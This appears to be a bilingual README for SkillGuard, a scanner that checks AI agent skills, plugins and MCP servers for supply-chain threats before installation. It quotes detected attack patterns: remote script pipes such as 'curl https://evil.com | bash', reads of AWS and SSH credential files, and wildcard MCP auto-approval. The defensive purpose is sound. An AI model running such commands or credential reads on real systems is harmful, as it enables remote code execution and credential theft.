# SkillGuard

**Agent skills are executable supply chains. Trust nothing you install.**

エージェントスキルは実行可能なサプライチェーンです。インストールするものは何も信頼しないでください。

---

## Overview / 概要

**English:** SkillGuard is a security scanner and "Skill Admission Controller" for AI Agent skills, plugins, MCP (Model Context Protocol) servers, and their dependencies. Before you install or deploy any agent skill, SkillGuard scans it for malicious patterns, credential theft, supply chain risks, and dangerous capabilities — blocking threats before they execute.

**日本語:** SkillGuardは、AIエージェントスキル、プラグイン、MCP（Model Context Protocol）サーバー、およびその依存関係のためのセキュリティスキャナー兼「スキルアドミッションコントローラー」です。エージェントスキルをインストールまたはデプロイする前に、悪意のあるパターン、認証情報の窃取、サプライチェーンリスク、危険な機能をスキャンし、実行前に脅威をブロックします。

---

## Why SkillGuard? / なぜSkillGuardが必要か？

The rise of AI agents has created a new attack surface: **agent skills and plugins**. These are code packages that agents download and execute — often automatically, often with broad system permissions.

**installするだけで侵入される時代** — In the era where merely installing a package can compromise your system, SkillGuard provides a critical last line of defense.

Common attack patterns SkillGuard detects:
- `curl https://evil.com | bash` — Remote code execution at install time
- `.pth` file injection — Python path manipulation for persistence
- Credential harvesting — Reading `~/.aws/credentials`, `~/.ssh/id_rsa`
- Supply chain attacks — Typosquatted packages, unpinned dependencies
- MCP server abuse — `autoApprove: ["*"]`, unrestricted shell access
- Obfuscated payloads — base64, hex-encoded, ROT13 commands

---

## Features / 機能

- **100+ security rules** across 8 categories: execution, persistence, credentials, network, supply chain, MCP/agent, obfuscation, destructive
- **Multi-target scanning**: Local files, local directories, GitHub repositories
- **MCP configuration analysis**: Detects dangerous MCP server settings
- **SBOM generation**: Software Bill of Materials for dependency tracking
- **Allowlist support**: `.skillguard.yaml` and inline `# skillguard:ignore` comments
- **CI/CD integration**: GitHub Actions workflow included
- **Multiple output formats**: Human-readable text (with Rich colors) and JSON
- **Three operating modes**: `report`, `warn`, `enforce`
- **Risk scoring**: 0-100 score with PASS/REVIEW/BLOCK decisions
- **Dangerous combination detection**: Automatic BLOCK for high-risk capability combos

---

## Quick Start / クイックスタート

### Installation

```bash
pip install skillguard
```

### Basic Scan

```bash
# Scan a local skill directory
skillguard scan ./my-skill/

# Scan a single file
skillguard scan ./install.sh

# Scan a GitHub repository
skillguard scan github:owner/repo
```

### Sample Output

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  SkillGuard Security Scan Report
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Target:   ./my-skill/
Score:    20/100
Decision: BLOCK

Execution Surface: install, hook
Capabilities: shell, network
Asset Exposure: credential

Findings (3):
  [CRITICAL] exec_curl_pipe_sh
    File: install.sh:5
    Match: curl https://evil-server.com/payload.sh | bash
    ...
```

---

## Scan Modes / スキャンモード

| Mode | Description | Exit Code (PASS) | Exit Code (REVIEW) | Exit Code (BLOCK) |
|------|-------------|-----------------|-------------------|------------------|
| `report` | Always exits 0, outputs findings | 0 | 0 | 0 |
| `warn` | Exits non-zero on findings | 0 | 1 | 2 |
| `enforce` | Strict mode with blocking messages | 0 | 1 | 2 |

```bash
# Report mode (default) - never fails CI
skillguard scan . --mode report

# Warn mode - fails CI on REVIEW or BLOCK
skillguard scan . --mode warn

# Enforce mode - same as warn with stricter messaging
skillguard scan . --mode enforce --format json
```

---

## Risk Scoring / リスクスコアリング

SkillGuard calculates a risk score starting at 100, with deductions per finding:

| Severity | Deduction |
|----------|-----------|
| CRITICAL | -40 |
| HIGH | -20 |
| MEDIUM | -10 |
| LOW | -5 |
| INFO | 0 |

**Decision thresholds** (customizable with `--threshold`):
- Score ≥ 80 → **PASS**
- Score 50-79 → **REVIEW**
- Score < 50 → **BLOCK**

**Automatic BLOCK** regardless of score for dangerous capability combinations:
- `INSTALL + SHELL + CREDENTIAL` → Always BLOCK
- `HOOK + NETWORK + SECRET` → Always BLOCK

---

## Allowlist / 許可リスト

Create `.skillguard.yaml` in your project root:

```yaml
# Rules to globally ignore
ignore_rules:
  - sc_requirements_no_hash
  - sc_npm_unpinned

# Files to skip entirely
ignore_files:
  - test_install.sh

# Path prefixes to skip
ignore_paths:
  - tests/
  - fixtures/
```

Or use inline comments:

```bash
# This is a known-safe pattern
curl https://raw.githubusercontent.com/pypa/pip/main/get-pip.py | python  # skillguard:ignore exec_curl_pipe_sh
```

---

## CI Integration / CI連携

### GitHub Actions

Add to `.github/workflows/skillguard.yml`:

```yaml
name: SkillGuard Security Scan
on:
  pull_request:
    branches: [main, master]
  push:
    branches: [main, master]

jobs:
  skillguard:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: "3.11"
      - name: Install SkillGuard
        run: pip install skillguard
      - name: Run SkillGuard Scan
        run: skillguard scan . --mode warn --format json > skillguard-report.json
      - name: Upload Report
        uses: actions/upload-artifact@v4
        if: always()
        with:
          name: skillguard-report
          path: skillguard-report.json
```

### Pre-commit Hook

```yaml
# .pre-commit-config.yaml
repos:
  - repo: local
    hooks:
      - id: skillguard
        name: SkillGuard Security Scan
        entry: skillguard scan . --mode enforce
        language: system
        pass_filenames: false
```

---

## Rule Categories / ルールカテゴリ

| Category | Rules | Description |
|----------|-------|-------------|
| `execution` | 15+ | Remote code execution patterns |
| `persistence` | 10+ | System persistence mechanisms |
| `credentials` | 20+ | Credential access and theft |
| `network` | 15+ | Network exfiltration patterns |
| `supply_chain` | 15+ | Dependency security issues |
| `mcp_agent` | 10+ | MCP server misconfigurations |
| `obfuscation` | 10+ | Code obfuscation techniques |
| `destructive` | 5+ | System-destructive patterns |

---

## JSON Output / JSON出力

```bash
skillguard scan . --format json | jq '.decision'
```

```json
{
  "target": "./my-skill/",
  "score": 20,
  "decision": "BLOCK",
  "findings": [...],
  "execution_surfaces": ["install"],
  "capabilities": ["shell", "network"],
  "asset_exposure": ["credential"],
  "scanned_files": ["install.sh", "requirements.txt"],
  "sbom": {"packages": [...]},
  "duration_seconds": 0.042
}
```

---

## GitHub Repository Scanning / GitHubリポジトリのスキャン

```bash
# Scan a public GitHub repository
skillguard scan github:owner/repo-name

# Or with full URL
skillguard scan https://github.com/owner/repo-name
```

SkillGuard clones the repository to a temporary directory, scans it, and cleans up automatically.

---

## Contributing / コントリビューション

Contributions are welcome. To add new rules, create or edit YAML files in the `rules/` directory:

```yaml
rules:
  - id: your_rule_id
    title: "Human readable title"
    description: "What this detects and why it matters"
    category: execution
    severity: HIGH
    file_patterns:
      - "*.sh"
      - "*.py"
    patterns:
      - "regex_pattern_here"
    execution_surface: [install]
    capabilities: [shell]
    asset_reach: []
```

---

## License / ライセンス

MIT License

Copyright (c) 2026 SkillGuard Contributors

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
